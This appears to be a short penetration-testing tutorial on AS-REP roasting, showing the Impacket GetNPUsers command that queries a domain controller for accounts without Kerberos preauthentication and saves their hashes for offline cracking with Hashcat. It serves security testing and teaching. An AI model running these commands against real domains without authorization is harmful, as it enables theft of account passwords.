Identifying AS-REPRoastable Accounts (Linux)

Using GetNPUsers.py from Impacket to find vulnerable users.

Impacket Command
impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile asreproast_hashes.txt corp.local/
  • •Queries the Domain Controller for users not requiring preauthentication.
  • •The -request flag fetches the Ticket Granting Tickets (TGTs).
  • •Saves the collected TGTs in a crackable format.
  • •corp.local/ specifies the target domain.
Prerequisite

This attack relies on the target user account having the DoesNotRequirePreAuth flag enabled.

Example Execution
impacket-GetNPUsers -dc-ip 192.168.1.100 -request -outputfile asreproast_hashes.txt corp.local/
Output Format

The asreproast_hashes.txt file will contain the collected TGTs in a Hashcat-compatible format (mode 18200).

Key Takeaway

GetNPUsers.py is the Linux equivalent for efficiently identifying and collecting AS-REPRoastable hashes.
